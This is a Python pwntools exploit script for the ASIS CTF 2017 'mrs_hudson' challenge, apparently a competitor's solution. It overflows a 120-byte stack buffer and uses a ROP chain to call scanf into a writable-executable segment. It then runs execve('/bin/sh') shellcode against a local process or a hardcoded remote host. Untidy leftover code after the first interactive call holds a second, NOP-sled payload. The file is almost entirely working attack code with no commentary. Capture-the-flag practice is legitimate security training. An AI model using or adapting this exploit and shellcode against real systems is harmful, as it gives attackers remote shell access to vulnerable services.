from pwn import *
import time

HOST = '146.185.168.172'
PORT = 8642

NOP = "\x90"

local = True
#local = False

if local:
    conn = process("./mrs._hudson")
    gdb.attach(conn)
else:
    conn = remote(HOST, PORT)

elf = ELF("./mrs._hudson")

context.log_level = 'debug'

""" Variable
"""
pop_rdi      = 0x004006f3         # pop rdi; ret
pop_rsi_r15  = 0x00000000004006f1 # pop rsi; pop r15; ret
scanf_plt    = 0x00400526         # scanf@PLT
scanf_string = 0x0040072b         # %s
bin_x        = 0x0000000000601090 # rwx segment

""" Here we go.
"""
log.info("[*] ASIS CTF 2017: mrs_hudson exploit.")

#Let's go back to 2000.
print conn.recvline()

""" ROP
"""
shellcode = "\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05"

# scanf("%s", @RWX_AREA)
#       rdi   rsi
rop =  p64(pop_rdi) + p64(scanf_string)
rop += p64(pop_rsi_r15) + p64(bin_x) + p64(0xdeadbeef)
rop += p64(scanf_plt)
rop += p64(bin_x)

conn.sendline("A"*120 + rop)
conn.sendline(shellcode)


""" End
"""
conn.interactive()








shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"


EIP = "AAAABBBB"

exploit = "A" * 120 + EIP + NOP * 1000 + shellcode




conn.sendline(exploit)


conn.interactive()
